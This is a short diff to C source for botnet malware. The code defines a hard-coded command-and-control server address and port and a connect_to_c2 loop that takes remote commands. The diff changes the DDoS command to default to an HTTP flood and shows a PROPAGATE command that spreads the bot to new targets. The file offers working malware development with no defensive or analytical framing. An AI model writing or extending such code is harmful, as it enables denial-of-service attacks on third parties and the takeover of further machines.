@@ -12,6 +12,7 @@
 #include <errno.h>
 #include <sys/wait.h>
 #include <dirent.h>
+#include <time.h>
 
 #define C2_SERVER "51.68.128.169"
 #define C2_PORT 1337
@@ -319,7 +320,7 @@ void connect_to_c2() {
                 char target[256];
                 int port, duration;
                 sscanf(buffer + 5, "%255[^:]:%d %d", target, &port, &duration);
-                ddos_attack(sockfd, target, port, duration);
+                ddos_attack(sockfd, target, port, duration, "http"); // Méthode par défaut: HTTP flood
             } else if (strncmp(buffer, "PROPAGATE ", 10) == 0) {
                 // Propager à une cible spécifique
                 propagate(sockfd, buffer + 10);
